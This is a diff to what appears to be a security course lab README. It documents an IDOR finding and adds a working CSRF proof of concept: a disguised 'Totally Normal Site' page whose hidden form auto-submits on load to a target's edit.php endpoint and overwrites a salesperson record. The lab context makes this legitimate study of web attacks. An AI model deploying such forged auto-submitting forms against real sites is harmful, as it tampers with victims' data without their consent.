@@ -42,9 +42,28 @@ Vulnerability #1: Insecure Direct Object Reference (IDOR)
 
 <img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/idor.gif">
 
-Vulnerability #2: __________________
+Vulnerability #2: Cross-Site Request Forgery (CSRF)
 
-<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/userenum.gif">
+```
+<html>
+  <head>
+  </head>
+  <body>
+	<h1><center>Totally Normal Site</center></h1>
+    	<form name="csrfForm" action="https://35.184.21.59/red/public/staff/salespeople/edit.php?id=1" method="post" target="hide">
+
+		<input type="hidden" name="first_name" value="Site Hacked">
+		<input type="hidden" name="last_name" value="By Brian">
+	</form>
+	<iframe name="hide" style="display: none;"></iframe>
+	<script>
+ 		document.csrfForm.submit();
+	</script>
+  </body>
+</html>
+```
+
+<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/csrf.gif">
 
 ## Notes
 
